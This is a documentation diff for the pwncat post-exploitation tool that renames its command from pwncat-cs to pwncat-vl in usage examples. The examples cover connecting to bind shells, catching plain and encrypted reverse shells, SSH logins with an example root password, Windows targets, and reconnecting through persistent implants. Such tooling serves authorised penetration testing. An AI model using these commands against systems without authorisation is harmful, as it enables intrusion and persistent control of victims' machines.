@@ -82,11 +82,11 @@ address which is routable (e.g. not NAT'd). The ``connect`` protocol provides th
     :caption: Connecting to a bind shell at 1.1.1.1:4444
 
     # netcat syntax
-    pwncat-cs 192.168.1.1 4444
+    pwncat-vl 192.168.1.1 4444
     # Full connection string
-    pwncat-cs connect://192.168.1.1:4444
+    pwncat-vl connect://192.168.1.1:4444
     # Connection string with assumed protocol
-    pwncat-cs 192.168.1.1:4444
+    pwncat-vl 192.168.1.1:4444
 
 Connecting to a victim encrypted bind shell
 -------------------------------------------
@@ -98,10 +98,10 @@ address which is routable (e.g. not NAT'd). The ``ssl-connect`` protocol provide
     :caption: Connecting to a bind shell at 1.1.1.1:4444
 
     # Full connection string
-    pwncat-cs connect://192.168.1.1:4444
+    pwncat-vl connect://192.168.1.1:4444
     # ncat style syntax
-    pwncat-cs --ssl 192.168.1.1 4444
-    pwncat-cs --ssl 192.168.1.1:4444
+    pwncat-vl --ssl 192.168.1.1 4444
+    pwncat-vl --ssl 192.168.1.1:4444
 
 Catching a victim reverse shell
 -------------------------------
@@ -114,13 +114,13 @@ victim machine. This mode is accessed via the ``bind`` protocol.
     :caption: Catching a reverse shell
 
     # netcat syntax
-    pwncat-cs -lp 4444
+    pwncat-vl -lp 4444
     # Full connection string
-    pwncat-cs bind://0.0.0.0:4444
+    pwncat-vl bind://0.0.0.0:4444
     # Assumed protocol
-    pwncat-cs 0.0.0.0:4444
+    pwncat-vl 0.0.0.0:4444
     # Assumed protocol, assumed bind address
-    pwncat-cs :4444
+    pwncat-vl :4444
 
 Catching a victim encrypted reverse shell
 -----------------------------------------
@@ -137,13 +137,13 @@ both point to the same bundled PEM file if both the key and certificate are pres
     :caption: Catching a reverse shell
 
     # ncat style syntax
-    pwncat-cs --ssl --ssl-cert cert.pem --ssl-key cert.pem -lp 4444
+    pwncat-vl --ssl --ssl-cert cert.pem --ssl-key cert.pem -lp 4444
     # Full connection string
-    pwncat-cs ssl-bind://0.0.0.0:4444?certfile=/path/to/cert.pem&keyfile=/path/to/key.pem
+    pwncat-vl ssl-bind://0.0.0.0:4444?certfile=/path/to/cert.pem&keyfile=/path/to/key.pem
     # Auto-generated self-signed certificate
-    pwncat-cs --ssl -lp 4444
+    pwncat-vl --ssl -lp 4444
     # Auto-generated self-signed certificate with explicit protocol
-    pwncat-cs ssl-bind://0.0.0.0:4444
+    pwncat-vl ssl-bind://0.0.0.0:4444
 
 Connecting to a Remote SSH Server
 ---------------------------------
@@ -159,11 +159,11 @@ protocol.
     :caption: Connection to a remote SSH server
 
     # SSH style syntax (assumed protocol, prompted for password)
-    pwncat-cs root@192.168.1.1
+    pwncat-vl root@192.168.1.1
     # Full connection string with password
-    pwncat-cs "ssh://root:r00t5P@ssw0rd@192.168.1.1"
+    pwncat-vl "ssh://root:r00t5P@ssw0rd@192.168.1.1"
     # SSH style syntax w/ identity file
-    pwncat-cs -i ./root_id_rsa root@192.168.1.1
+    pwncat-vl -i ./root_id_rsa root@192.168.1.1
 
 Connecting to a Windows Target
 ------------------------------
@@ -175,11 +175,11 @@ a platform during invocation. For example, to connect to a Windows bind shell at
     :caption: Connect to Windows bind shell
 
     # netcat syntax
-    pwncat-cs -m windows 192.168.1.1 4444
+    pwncat-vl -m windows 192.168.1.1 4444
     # Full connection string
-    pwncat-cs -m windows connect://192.168.1.1:4444
+    pwncat-vl -m windows connect://192.168.1.1:4444
     # Connection string with assumed protocol
-    pwncat-cs -m windows 192.168.1.1:4444
+    pwncat-vl -m windows 192.168.1.1:4444
 
 Reconnecting to a victim
 ------------------------
@@ -192,7 +192,7 @@ with either the IP address or unique host ID of a target.
 .. code-block:: bash
     :caption: List Installed Persistent Implants
 
-    pwncat-cs --list
+    pwncat-vl --list
 
 pwncat will attempt to reconnect to a host automatically if needed. Specifically, if no explicit protocol,
 port, identity or password is specified, pwncat assumes you would like to be reconnected to the specified
@@ -202,6 +202,6 @@ host and attempts to reconnect via a matching implant prior to attempting direct
     :caption: Reconnecting to a known host
 
     # Attempt reconnection as any user; specify host ID
-    pwncat-cs 999c434fe6bd7383f1a6cc10f877644d
+    pwncat-vl 999c434fe6bd7383f1a6cc10f877644d
     # Attempt reconnection first as the specified user
-    pwncat-cs user@192.168.1.1
+    pwncat-vl user@192.168.1.1
